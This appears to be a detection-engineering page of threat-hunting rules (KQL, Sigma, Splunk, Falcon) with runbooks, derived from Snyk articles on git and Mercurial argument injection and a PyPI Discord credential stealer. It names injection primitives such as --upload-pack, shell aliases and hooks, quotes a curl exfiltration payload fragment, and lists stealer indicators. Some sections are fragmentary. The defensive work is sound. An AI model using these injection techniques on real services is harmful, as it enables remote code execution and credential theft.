Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)

Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Git argument injection via --upload-pack option spawned by web-app runtime · [LLM] Mercurial argument injection via --config alias/hooks or --debugger from app runtime · [LLM] git/hg spawning a shell as child of a web-app runtime (argument-injection RCE evidence) · Article-specific behavioural hunt — Rediscovering argument injection when using VCS tools — git and mercurial
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Git argument injection via --upload-pack option spawned by web-app runtime AIExploitation High
Hunts a server-side application runtime (node/python/ruby/java/php) invoking git with an attacker-controllable --upload-pack option on the ls-remote/fetch/pull/clone/fetch-pack subcommands. Per Snyk, this lets a remote user smuggle a shell command past a 'safe' spawn() API (no shell metacharacters needed), as exploited in ungit (CVE-2022-25766) and simple-git (CVE-2022-24433). Rationale: Anchors on the article's exact dangerous option string '--upload-pack' on the named affected subcommands (ls-remote/fetch/pull/clone/fetch-pack), gated by a web-app-runtime parent which matches Snyk's stated target (web apps/libraries, not CLI use). The git-upload-pack exclusion removes the only legitimate use (pointing at a custom server binary). Cross-checked Snyk blog + ungit CVE-2022-25766 advisory (real payload --upload-pack=curl ... --data "$(id)") + simple-git CVE-2022-24433. Cross-checked against: • https://snyk.io/blog/argument-injection-when-using-git-and-mercurial/ • https://security.snyk.io/vuln/SNYK-JS-UNGIT-2414099 • https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-2421199
ATT&CKT1190 T1059.004 T1059.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • DevOps wrapper scripts (node/python) that legitimately pass --upload-pack=/path/to/git-upload-pack to reach a non-default server-side binary over SSH
  • Git LFS or custom transport tooling invoked from a build agent that wraps git in a python/ruby orchestrator
  • CI runners executing git fetch with a pinned --upload-pack path for a self-hosted Git server
  • Internal repo-sync services that shell out to git from a Java/Node service with administrator-configured upload-pack overrides
Suppression filter
| where not(ProcessCommandLine has "git-upload-pack")
Response runbook
1) TRIAGE: Pull the full git ProcessCommandLine and read the --upload-pack value. A path ending in git-upload-pack is benign; anything containing a space, command name, sub-shell ($()/backticks) or URL is an injection. Confirm the parent runtime and which app endpoint shelled out (InitiatingProcessCommandLine). 2) CONTAIN: Isolate the host, kill the git process tree, and rotate any secrets/tokens accessible to the web-app service account. Take the vulnerable endpoint offline or WAF-block the parameter. 3) HUNT: Pivot on the same DeviceId for child shells spawned by git (see the process-tree UC), outbound connections from git/sh to attacker infra, and review web/app access logs for the repo-url/branch parameter carrying '--upload-pack'.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("git","git.exe")
| where ProcessCommandLine has "--upload-pack"
| where ProcessCommandLine has_any ("ls-remote","fetch","pull","clone","fetch-pack")
| where InitiatingProcessFileName in~ ("node","node.exe","python","python3","python.exe","ruby","ruby.exe","java","java.exe","php","php-fpm","php-cgi.exe","w3wp.exe","gunicorn","uwsgi","puma","unicorn")
| where AccountName !endswith "$"
| where not(ProcessCommandLine has "git-upload-pack")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName has_any ("\\git.exe","/git")
| where CommandLine has "--upload-pack"
| where CommandLine has_any ("ls-remote","fetch","pull","clone","fetch-pack")
| where ParentProcessName has_any ("node","python","ruby","java","php","w3wp.exe","gunicorn","uwsgi","puma","unicorn")
| where not(CommandLine has "git-upload-pack")
| project TimeGenerated, Computer, Account, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc
title: Git --upload-pack Argument Injection From Application Runtime
id: 7f3a1c2e-4b6d-4a91-9c0e-2d5f8a1b6c34
description: Detects a server-side application runtime invoking git with an attacker-controllable --upload-pack option, enabling arbitrary command execution via argument injection (Snyk research; CVE-2022-25766 ungit, CVE-2022-24433 simple-git).
references:
  - https://snyk.io/blog/argument-injection-when-using-git-and-mercurial/
  - https://security.snyk.io/vuln/SNYK-JS-UNGIT-2414099
author: SOC Detection Engineering
date: 2026/06/29
tags:
  - attack.t1190
  - attack.t1059.004
  - attack.t1059.003
logsource:
  category: process_creation
detection:
  selection_git:
    Image|endswith:
      - '\git.exe'
      - '/git'
  selection_opt:
    CommandLine|contains: '--upload-pack'
  selection_parent:
    ParentImage|endswith:
      - '\node.exe'
      - '/node'
      - '\python.exe'
      - '/python'
      - '/python3'
      - '\ruby.exe'
      - '/ruby'
      - '\java.exe'
      - '/java'
      - '\php.exe'
      - '/php'
      - '/php-fpm'
      - '\w3wp.exe'
  filter_legit:
    CommandLine|contains: 'git-upload-pack'
  condition: selection_git and selection_opt and selection_parent and not filter_legit
level: high
source:windows.sysmon @EventID:1 @Image:(*\\git.exe OR *\\Git.exe OR *\\GIT.EXE) @CommandLine:*--upload-pack* @ParentImage:(*\\node.exe OR *\\python.exe OR *\\ruby.exe OR *\\java.exe OR *\\php.exe OR *\\php-cgi.exe OR *\\w3wp.exe) -@CommandLine:*git-upload-pack*
#event_simpleName=ProcessRollup2 ImageFileName=/\\git(\.exe)?$/i CommandLine=/--upload-pack/i ParentBaseFileName=/^(node|python[0-9]?|ruby|java|php|php-fpm|w3wp|gunicorn|uwsgi|puma|unicorn)(\.exe)?$/i
| NOT (CommandLine=/git-upload-pack/i)
| table([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine])
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name IN ("git","git.exe")) AND (Processes.process="*--upload-pack*") AND (Processes.parent_process_name IN ("node","node.exe","python","python3","python.exe","ruby","ruby.exe","java","java.exe","php","php-fpm","php-cgi.exe","w3wp.exe","gunicorn","uwsgi","puma","unicorn")) by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process Processes.process_id | `drop_dm_object_name(Processes)` | search NOT process="*git-upload-pack*" | convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name IN ("git","git.exe")) AND (Processes.process="*--upload-pack*") AND (Processes.parent_process_name IN ("node","node.exe","python","python3","python.exe","ruby","ruby.exe","java","java.exe","php","php-fpm","php-cgi.exe","w3wp.exe","gunicorn","uwsgi","puma","unicorn")) by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process Processes.process_id | `drop_dm_object_name(Processes)` | search NOT process="*git-upload-pack*" | convert ctime(firstTime) ctime(lastTime)
Mercurial argument injection via --config alias/hooks or --debugger from app runtime AIExploitation High
Hunts hg invoked with an injected --config=alias.<cmd>=!<shell> shell alias, --config=hooks.pre-/post-<cmd>=<shell> hook, or --debugger flag. Per Snyk, mercurial needs only a single controllable argument (even the only one) to achieve RCE, making it easier to exploit than git. Confirmed against Weblate (CVE-2022-23915) and the documented hg argument-injection vectors. Rationale: Anchors on mercurial's exact injection primitives from the article: shell alias 'alias.<cmd>=!' (the '!' is what makes it a shell alias), 'hooks.pre-/hooks.post-' hooks, plus the corroborated '--debugger' flag. The alias regex requires the '!' so it ignores benign aliases that map to other hg commands; legit '--config ui.*'/'extensions.*' usage is excluded by construction. Cross-checked Snyk blog + SonarSource hg argument-injection-vectors + Phabricator T13012 (--config/--debugger RCE) + Weblate CVE-2022-23915. Cross-checked against: • https://snyk.io/blog/argument-injection-when-using-git-and-mercurial/ • https://sonarsource.github.io/argument-injection-vectors/binaries/hg/ • https://secure.phabricator.com/T13012 • https://security.snyk.io/vuln/SNYK-PYTHON-WEBLATE-2414088
ATT&CKT1190 T1059.004 T1059.003
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • RhodeCode/Kallithea/SCM-Manager hosting platforms that legitimately set repository hooks via 'hg --config hooks.*' (often pointing at 'python:module.func' rather than a shell command)
  • Admin automation that defines a temporary alias via --config for a maintenance batch job
  • Developers running 'hg --debugger' interactively to drop into pdb while debugging an extension
  • Backup/mirroring scripts that set hooks.pre-/post- to a vetted internal script path
Suppression filter
| where not(ProcessCommandLine has "python:")
Response runbook
1) TRIAGE: Read the hg ProcessCommandLine. For alias.*=! and hooks.pre-/post-, inspect the value: a 'python:' target is usually a legit hg hook, while a raw shell command (id/whoami/curl/bash -c) or '!'-prefixed alias is injection. Identify the calling app endpoint via InitiatingProcessCommandLine. 2) CONTAIN: Kill the hg process tree, isolate the host, and rotate credentials reachable by the service account; block/patch the vulnerable parameter (add '--' before user input or upgrade the affected library). 3) HUNT: Look for hg/sh child processes performing discovery or egress on the same host, and grep app logs for repo-url/source/branch fields containing '--config' or '--debugger'.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("hg","hg.exe")
| where (ProcessCommandLine has "--config" and (ProcessCommandLine matches regex @"(?i)alias\.[a-z0-9_-]+\s*=\s*!" or ProcessCommandLine has_any ("hooks.pre-","hooks.post-"))) or ProcessCommandLine has "--debugger"
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName has_any ("\\hg.exe","/hg")
| where (CommandLine has "--config" and (CommandLine matches regex @"(?i)alias\.[a-z0-9_-]+\s*=\s*!" or CommandLine has_any ("hooks.pre-","hooks.post-"))) or CommandLine has "--debugger"
| project TimeGenerated, Computer, Account, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc
title: Mercurial --config Alias/Hook or --debugger Argument Injection
id: b2c9e4a1-7d83-4f50-8a26-1e6c3b9d0f72
description: Detects hg invoked with an injected shell alias (--config=alias.X=!cmd), pre/post command hook (--config=hooks.pre-*/post-*), or the --debugger flag, enabling RCE via argument injection (Snyk research; CVE-2022-23915 Weblate).
references:
  - https://snyk.io/blog/argument-injection-when-using-git-and-mercurial/
  - https://sonarsource.github.io/argument-injection-vectors/binaries/hg/
author: SOC Detection Engineering
date: 2026/06/29
tags:
  - attack.t1190
  - attack.t1059.004
  - attack.t1059.003
logsource:
  category: process_creation
detection:
  selection_hg:
    Image|endswith:
      - '\hg.exe'
      - '/hg'
  selection_config:
    CommandLine|contains: '--config'
  selection_payload:
    CommandLine|contains:
      - 'hooks.pre-'
      - 'hooks.post-'
  selection_alias:
    CommandLine|re: '(?i)alias\.[a-z0-9_-]+\s*=\s*!'
  selection_debugger:
    CommandLine|contains: '--debugger'
  condition: selection_hg and ( (selection_config and (selection_payload or selection_alias)) or selection_debugger )
level: high
source:windows.sysmon @EventID:1 @Image:(*\\hg.exe OR *\\Hg.exe OR *\\HG.EXE) ((@CommandLine:*--config* AND (@CommandLine:*alias.* OR @CommandLine:*hooks.pre-* OR @CommandLine:*hooks.post-*)) OR @CommandLine:*--debugger*)
#event_simpleName=ProcessRollup2 ImageFileName=/\\hg(\.exe)?$/i ((CommandLine=/--config/i (CommandLine=/alias\.[a-z0-9_-]+\s*=\s*!/i OR CommandLine=/hooks\.(pre|post)-/i)) OR CommandLine=/--debugger/i)
| table([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine])
ENDPOINT

| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name IN ("hg","hg.exe")) AND ((Processes.process="*--config*" AND (Processes.process="*alias.*=!*" OR Processes.process="*hooks.pre-*" OR Processes.process="*hooks.post-*")) OR Processes.process="*--debugger*") by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process Processes.process_id | `drop_dm_object_name(Processes)` | convert ctime(firstTime) ctime(lastTime)
git/hg spawning a shell as child of a web-app runtime (argument-injection RCE evidence) AIExploitation Medium
Behavioral catch-all for the execution stage of git/hg argument injection: a server-side runtime (node/python/ruby/java/php) invokes git or hg, which in turn spawns a shell (sh/bash/cmd/powershell) to run the injected command. Catches the RCE regardless of which specific injectable option (--upload-pack, --config alias/hooks, --debugger) was abused. Rationale: Targets the actual command-execution evidence (git/hg becoming the parent of a shell process) rather than the injection string, using the article's stated process-chain shape: app-runtime -> git/hg -> shell. The grandparent web-runtime constraint (Defender InitiatingProcessParentFileName) keeps it tied to the server-side scenario Snyk describes. Sentinel/Falcon variants drop the grandparent (4688 / FDR single-event lack it) so they are noisier and run as hunting. Cross-checked against: • https://snyk.io/blog/argument-injection-when-using-git-and-mercurial/ • https://security.snyk.io/vuln/SNYK-JS-UNGIT-2414099
ATT&CKT1059.004 T1059.003 T1190
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • git invoking sh for credential helpers, askpass, or git-sh-setup during normal fetch/clone from a CI runner
  • Husky/git-hooks under node spawning sh for legitimate pre-commit/post-checkout scripts
  • git-lfs smudge/clean filters shelling out during checkout from a build agent
  • Mercurial extensions or hooks that legitimately invoke a shell wrapper during automated mirroring
  • Developer tooling (IDE git integration) wrapped in a node/python launcher that triggers git hook scripts
Suppression filter
| where not(ChildCmd has_any ("git-sh-setup","git-lfs","credential","askpass","husky"))
Response runbook
1) TRIAGE: Inspect the child shell's command line (ChildCmd) and the parent git/hg command line. Benign helpers reference git-sh-setup/credential/askpass/git-lfs or a known hook path; recon commands (id/whoami/uname), downloaders (curl/wget), or reverse-shell strings indicate exploitation. Confirm the grandparent is an internet-facing app service. 2) CONTAIN: Kill the process tree, isolate the host, rotate the service account's secrets/tokens, and pull the offending app endpoint or WAF-block the input parameter. 3) HUNT: Correlate with the git/hg cmdline UCs to recover the exact injected option, review outbound connections from the shell, and search app/web logs for repo/branch/source parameters containing '--upload-pack', '--config', or '--debugger'.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName in~ ("git","git.exe","hg","hg.exe")
| where FileName in~ ("sh","sh.exe","bash","bash.exe","dash","zsh","cmd.exe","powershell.exe","pwsh")
| where InitiatingProcessParentFileName in~ ("node","node.exe","python","python3","python.exe","ruby","ruby.exe","java","java.exe","php","php-fpm","php-cgi.exe","w3wp.exe","gunicorn","uwsgi","puma","unicorn")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, GrandParent=InitiatingProcessParentFileName, Parent=InitiatingProcessFileName, ParentCmd=InitiatingProcessCommandLine, Child=FileName, ChildCmd=ProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where ParentProcessName has_any ("\\git.exe","/git","\\hg.exe","/hg")
| where NewProcessName has_any ("\\sh.exe","/sh","\\bash.exe","/bash","/dash","\\cmd.exe","\\powershell.exe","/pwsh")
| project TimeGenerated, Computer, Account, ParentProcessName, NewProcessName, CommandLine
| order by TimeGenerated desc

#event_simpleName=ProcessRollup2 ParentBaseFileName=/^(git|hg)(\.exe)?$/i ImageFileName=/\\(sh|bash|dash|zsh|cmd|powershell|pwsh)(\.exe)?$/i
| table([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine])

How open source C++ code can introduce security risks

Snyk
2022-08-22 3 use cases 2 techniques 6 kill-chain phases detected

This article explores how open source code introduces vulnerabilities into the software supply chain. It also highlights how you can identify vulnerabilities in C++ open source security using automated vulnerability scanners.

CVEsCVE-2015-7547
ATT&CKT1190 T1195.002
IPs104.248.94.23
Click any ATT&CK pill below to open it on the Matrix
Phase 1

Installation

Phase 6
Command & Control

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key.
Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Asset exposure — vulnerability matches article CVE(s) Reconnaissance High
Match vulnerability scanner output to the CVE(s) named in the article.
ATT&CKT1190
Data sourcesVulnerabilities DeviceInfo DeviceTvmSoftwareVulnerabilities
// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2015-7547")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2015-7547")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

    where Vulnerabilities.signature IN ("CVE-2015-7547")
    by Vulnerabilities.dest, Vulnerabilities.signature, Vulnerabilities.severity, Vulnerabilities.cve
| `drop_dm_object_name(Vulnerabilities)`
| sort - severity

Data sourcesEndpoint.Processes DeviceProcessEvents

| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")

SecurityEvent

| where EventID == 4688

| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")

   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02

    category: process_creation

            - '\powershell.exe'

            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'

        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium

Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Python interpreter drops EXE sourced from Discord CDN (cyphers/stealthpy PyPI malware) · Phishing-link click correlated to endpoint execution
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · Article-specific behavioural hunt — Snyk finds PyPi malware that steals Discord and Roblox credential and payment in
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Process execution from masquerade directory C:\$Windows.~SXK (Discord/Roblox stealer) · [LLM] Discord client tampering via index.js overwrite in discord_desktop_core (Discord Injector)
Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Discord webhook / CDN exfiltration from non-browser process (Empyrean stealer C2)
Python interpreter drops EXE sourced from Discord CDN (cyphers/stealthpy PyPI malware) AIDelivery High
Hunts a Python/pip process writing a Windows PE to disk whose download origin is cdn.discordapp.com/attachments — the exact delivery mechanism of this PyPI stealer family (cyphers, stealthpy, plutos, testpipper). Legitimate software almost never fetches an .exe payload from the Discord file CDN via the Python interpreter. Rationale: Anchors on the article's verbatim setup.py logic (requests.get of cdn.discordapp.com/attachments .exe written via Python) plus the named payloads ZYXMN.exe/ZYRBX.exe and the $Windows.~SXK drop path — Python interpreter + Discord-CDN PE origin is extremely rare in benign use.
ATT&CKT1195.002 T1105 T1059.006
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Developer manually using requests/urllib in a build script that legitimately fetches a tool hosted on a Discord attachment link
  • Game-mod or bot tooling that distributes updaters via Discord CDN
  • Security researcher detonating the sample in a sandbox
  • Python-based installer pulling a signed bundled binary from Discord (rare)
Suppression filter
| where not (InitiatingProcessCommandLine has_any ("site-packages\\pip","pip install") and FolderPath has "\\AppData\\Local\\Programs\\")
Response runbook
Step 1 (triage): Pull the InitiatingProcessCommandLine — confirm a `pip install` / setup.py context and identify the source package name (e.g. cyphers, stealthpy, plutos). Hash the dropped EXE and check it against the named payloads ZYXMN/ZYRBX. Step 2 (contain): Isolate the host, kill the python and dropped-EXE processes, remove the EXEs from C:\$Windows.~SXK\, and force Chrome/Discord password + token rotation for the logged-on user (browser creds and Discord tokens are the loot). Step 3 (hunt): Pivot to UC2/UC3/UC4 on the same DeviceId — look for execution from $Windows.~SXK, index.js tampering in discord_desktop_core, and outbound discord.com/api/webhooks beacons.
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName endswith ".exe"
| where FileOriginUrl has "cdn.discordapp.com/attachments"
| where InitiatingProcessFileName in~ ("python.exe","pythonw.exe","pip.exe")
| project Timestamp, DeviceName, FileName, FolderPath, FileOriginUrl, SHA256,
          InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath
| order by Timestamp desc
ImWebSession
| where TimeGenerated > ago(30d)
| where Url has "cdn.discordapp.com/attachments"
| where FileName endswith ".exe" or Url endswith ".exe"
| project TimeGenerated, SrcHostname, SrcIpAddr, SrcUsername, Url, FileName, DstHostname, HttpRequestHeaderUserAgent
| order by TimeGenerated desc
title: Executable Downloaded from Discord CDN by Python Interpreter
id: 6c1f2e0a-4b6d-49a1-9c2e-2a7f3d8b1c04
description: Python/pip writing a PE to disk with a cdn.discordapp.com origin, matching the cyphers PyPI stealer delivery chain.
references:
  - https://snyk.io/blog/pypi-malware-discord-roblox-credential-payment-info/
author: SOC Detection Engineering
date: 2026/06/29
tags:
  - attack.t1195.002
  - attack.t1105
  - attack.t1059.006
logsource:
  category: file_event
  product: windows
detection:
  selection:
    Image|endswith:
      - '\python.exe'
      - '\pythonw.exe'
      - '\pip.exe'
    TargetFilename|endswith: '.exe'
  condition: selection
level: high
source:windows.sysmon @EID:3 @Image:(*\python.exe OR *\pythonw.exe OR *\Python.exe OR *\PYTHON.EXE) @DestinationHostname:(cdn.discordapp.com OR *.discordapp.com)
#event_simpleName=FileWritten TargetFileName=/\.exe$/i
| ContextImageFileName=/\\python(w)?\.exe$/i
| regex("\\\\\$Windows\\.~SXK\\\\|ZYXMN|ZYRBX|ZYXM|Main", field=TargetFileName)
| groupBy([aid, ComputerName, ContextImageFileName, TargetFileName], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime values(Filesystem.file_path) as file_path values(Filesystem.file_name) as file_name from datamodel=Endpoint.Filesystem where (Filesystem.process_name IN ("python.exe","pythonw.exe","pip.exe")) (Filesystem.file_name="*.exe") by Filesystem.dest Filesystem.process_name Filesystem.file_name | `drop_dm_object_name(Filesystem)` | search file_name IN ("ZYXMN.exe","ZYRBX.exe","ZYXM.exe","Main.exe","WIN-siP1VyGDrfCYO2k3.exe","WIN-XnWfTdfJsypQWB9d.exe") OR file_path="*$Windows.~SXK*" | convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Filesystem.file_path) as file_path values(Filesystem.file_name) as file_name from datamodel=Endpoint.Filesystem where (Filesystem.process_name IN ("python.exe","pythonw.exe","pip.exe")) (Filesystem.file_name="*.exe") by Filesystem.dest Filesystem.process_name Filesystem.file_name | `drop_dm_object_name(Filesystem)` | search file_name IN ("ZYXMN.exe","ZYRBX.exe","ZYXM.exe","Main.exe","WIN-siP1VyGDrfCYO2k3.exe","WIN-XnWfTdfJsypQWB9d.exe") OR file_path="*$Windows.~SXK*" | convert ctime(firstTime) ctime(lastTime)
Process execution from masquerade directory C:\$Windows.~SXK (Discord/Roblox stealer) AIInstallation High
Hunts any process whose image path lives under the bogus C:\$Windows.~SXK\ directory the cyphers PyPI malware creates to stage and launch ZYXMN.exe/ZYRBX.exe under WIN-*.exe aliases before deleting the folder. This path is unique to the campaign and not a real Windows system location. Rationale: C:\$Windows.~SXK\ with the WIN-siP1VyGDrfCYO2k3.exe / WIN-XnWfTdfJsypQWB9d.exe aliases is taken verbatim from the setup.py in the article — a fabricated, hidden-looking system path that no legitimate installer uses, giving near-zero FP.
ATT&CKT1036.005 T1564.001 T1059.006
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Windows servicing/upgrade leaves transient $WINDOWS.~BT or $Windows.~WS folders — these differ from $Windows.~SXK but a loose substring match could clip them
  • Custom enterprise imaging scripts that stage tooling under a $-prefixed hidden folder
  • Forensic/IR tooling extracting samples into a similarly named path during analysis
Suppression filter
| where not (FolderPath has "$WINDOWS.~BT" or FolderPath has "$Windows.~WS")
Response runbook
Step 1 (triage): Confirm the FolderPath is literally C:\$Windows.~SXK (not a genuine $WINDOWS.~BT servicing folder) and capture the FileName/SHA256 — expect WIN-*.exe aliases of ZYXMN/ZYRBX. Step 2 (contain): Isolate host, terminate the offending processes, and quarantine the EXEs; the folder self-deletes (shutil.rmtree) so collect artifacts fast. Step 3 (hunt): Search the same host for the parent python.exe install (UC1), Discord index.js tampering (UC3), and webhook exfil (UC4); rotate Chrome, Discord, and Roblox credentials for the user.
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FolderPath has "$Windows.~SXK"
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, SHA256,
          ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName has "$Windows.~SXK"
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

Discord client tampering via index.js overwrite in discord_desktop_core (Discord Injector) AIInstallation High
Hunts a non-Discord process writing index.js into a discord_desktop_core module folder under %LOCALAPPDATA%\Discord* — the persistence/injection step where this malware drops Rdimo Discord-Injection JavaScript to skim tokens and entered credit-card details on every Discord launch. Rationale: The Injection class in the decompiled ZYXMN.pyc writes self.code into <discord_desktop_core>\index.js across LOCALAPPDATA\Discord/Canary/PTB/Development dirs — a file write to that exact module path by anything other than the Discord updater is a direct fingerprint of the injector (Rdimo Discord-Injection). Cross-checked against: • https://github.com/Rdimo/Discord-Injection
ATT&CKT1554 T1539 T1056.002
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • BetterDiscord / Vencord / Powercord client mods legitimately patching index.js via their own installer
  • Discord's own Update.exe rewriting the core module after a client update (excluded)
  • Developer hand-editing index.js while debugging a Discord client plugin
  • Backup/sync software rehydrating the AppData\Discord folder
Suppression filter
| where InitiatingProcessFileName !in~ ("BetterDiscord.exe","Vencord.exe","Powercord.exe") and InitiatingProcessFolderPath !has "BetterDiscord"
Response runbook
Step 1 (triage): Open the written index.js and inspect for obfuscated JS referencing a %WEBHOOK% / discord.com/api/webhooks payload and the BetterDiscord-style variable names (_0x...) described in the article. Identify the writing process. Step 2 (contain): Isolate host, restore/remove the tampered index.js, force-close Discord, and invalidate the user's Discord session token (Discord password change rotates tokens). Warn the user any card details entered into Discord since infection are compromised. Step 3 (hunt): Correlate to UC1/UC2 on the same host and search UC4 for outbound webhook beacons exfiltrating the skimmed data.
DeviceFileEvents
| where Timestamp > ago(30d)
| where FileName =~ "index.js"
| where FolderPath has "discord_desktop_core"
| where InitiatingProcessFileName !in~ ("Discord.exe","DiscordCanary.exe","DiscordPTB.exe","DiscordDevelopment.exe","Update.exe","msedgewebview2.exe")
| project Timestamp, DeviceName, FileName, FolderPath, SHA256,
          InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine
| order by Timestamp desc
ImFileEvent
| where TimeGenerated > ago(30d)
| where TargetFileName =~ "index.js"
| where TargetFilePath has "discord_desktop_core"
| where ActingProcessName !has "Discord" and ActingProcessName !has "Update.exe"
| project TimeGenerated, DvcHostname, TargetFilePath, ActingProcessName, ActingProcessCommandLine, ActorUsername
| order by TimeGenerated desc

Discord webhook / CDN exfiltration from non-browser process (Empyrean stealer C2) AIActions on Objectives Medium
